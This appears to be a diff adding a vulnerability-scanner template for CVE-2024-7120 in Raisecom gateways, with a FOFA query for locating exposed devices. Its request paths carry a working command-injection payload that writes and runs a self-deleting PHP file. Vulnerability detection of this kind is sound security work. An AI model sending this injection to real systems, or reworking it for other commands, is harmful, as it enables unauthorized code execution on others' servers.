@@ -1,0 +1,45 @@
+id: raisecom-multi-business-gateway-rce
+
+info:
+  name: Raisecom Multi-Business Gateway Remote Command Execution
+  author: Co5mos
+  severity: critical
+  description: Raisecom Multi-Business Gateway list_base_config.php contains a remote command execution vulnerability, allowing unauthenticated remote attackers to execute arbitrary code on the server, upload backdoors, and potentially take control of the entire web server.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%91%9E%E6%96%AF%E5%BA%B7%E8%BE%BE-%E5%A4%9A%E4%B8%9A%E5%8A%A1%E6%99%BA%E8%83%BD%E7%BD%91%E5%85%B3-RCE.md
+  metadata:
+    verified: true
+    cve-id: CVE-2024-7120
+    fofa-query: body="/images/raisecom/back.gif" && title=="Web user login"
+  tags: raisecom, rce
+
+variables:
+  filename: "{{rand_base(6)}}.php"
+  payload: "%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3Bunlink%28__FILE__%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2F{{filename}}%60"
+
+http:
+  - raw:
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /tmp/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      path:
+        - /vpn/list_base_config.php?type=mod&parts=base_config&template={{payload}}
+        - /vpn/list_ip_network.php?Nradius_submit=ture&type=mod&parts=base_config&template={{payload}}
+        - /vpn/list_service_manage.php?Nradius_submit=ture&type=mod&parts=base_config&template={{payload}}
+        - /vpn/list_vpn_web_custom.php?Nradius_submit=tur&type=mod&parts=base_config&template={{payload}}
+        - /vpn/vpn_template_style.php?mySubmit=true&type=mod&parts=base_config&template={{payload}}
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2, "phpinfo()")
+          - contains(body_2, "PHP Version")
+        condition: and
